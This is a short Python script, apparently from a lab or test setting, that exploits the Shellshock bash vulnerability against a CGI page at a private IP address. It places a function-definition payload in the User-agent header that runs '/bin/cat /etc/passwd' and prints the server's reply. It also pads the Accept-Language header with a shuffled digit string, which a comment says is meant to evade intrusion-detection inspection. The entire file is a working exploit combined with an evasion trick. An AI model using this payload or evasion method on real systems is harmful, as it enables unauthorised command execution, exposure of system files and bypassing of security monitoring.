import requests
from collections import OrderedDict
import numpy as np


url = 'http://10.2.142.226/cgi-bin/index.cgi'
long_header = range(1,700)
np.random.shuffle(long_header)
long_header = map(str,long_header)
long_header = ''.join(long_header) # Long header to evade ids depth inspection
print(long_header)
shellcode =  '() { :; }; echo \"Content-type: text/plain\"; echo \"\"; echo \"\"; /bin/cat /etc/passwd'
s = requests.session()
s.headers = OrderedDict([('Accept-Language',long_header),('User-agent',shellcode)])
r = s.get(url)
print(r.text)
